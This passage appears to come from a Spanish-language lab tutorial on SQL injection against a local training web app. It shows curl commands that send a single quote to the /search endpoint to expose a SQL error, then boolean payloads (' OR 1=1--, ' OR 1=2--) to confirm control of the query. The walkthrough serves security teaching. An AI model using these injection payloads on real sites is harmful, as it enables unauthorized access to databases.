2. **Búsqueda** (`/search?q=laptop`): busca productos. Nota el texto rojo

## Detectar el punto de inyección

Prueba en `/search`:

```bash
# Normal
curl "http://127.0.0.1:18081/search?q=laptop"

# Con una comilla simple → error de SQL
curl "http://127.0.0.1:18081/search?q='"
```

El error revela que tu entrada entra DIRECTO en la consulta SQL:

```text
SELECT id, name, price, description FROM products
WHERE name LIKE '%'%' OR description LIKE '%'%'
                                          ^ tu comilla rompe la sintaxis
```

**Confirmación booleana**:

```bash
# TRUE: devuelve productos (1=1 siempre es verdadero)
curl "http://127.0.0.1:18081/search?q=' OR 1=1--"

# FALSE: no devuelve nada (1=2 siempre es falso)
curl "http://127.0.0.1:18081/search?q=' OR 1=2--"
```

Si `OR 1=1` muestra más resultados que `OR 1=2`, tienes control del WHERE.
